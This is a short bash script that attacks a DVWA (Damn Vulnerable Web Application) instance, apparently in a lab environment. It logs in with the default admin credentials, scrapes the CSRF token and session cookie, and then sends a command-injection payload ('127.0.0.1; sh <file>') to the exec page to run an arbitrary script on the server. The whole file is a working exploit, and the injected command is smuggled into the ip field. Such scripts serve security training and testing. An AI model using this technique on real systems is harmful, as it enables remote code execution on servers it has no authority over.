#!/bin/bash

cmd="/var/www/html/$1"
host="dvwa-$TL_CONSOLE"
curl -v -u $TL_USER:$TL_PASS https://$host/login.php
CSRF=$(curl -s -u $TL_USER:$TL_PASS -c dvwa.cookie "https://$host/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
curl -s -b dvwa.cookie -u $TL_USER:$TL_PASS -d "username=admin&password=password&user_token=${CSRF}&Login=Login" "https://$host/login.php"
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F '\t' '{print $7}')
curl -b dvwa.cookie -u $TL_USER:$TL_PASS "https://$host/vulnerabilities/exec/" -d "ip=127.0.0.1%3B+sh+$cmd&Submit=Submit"
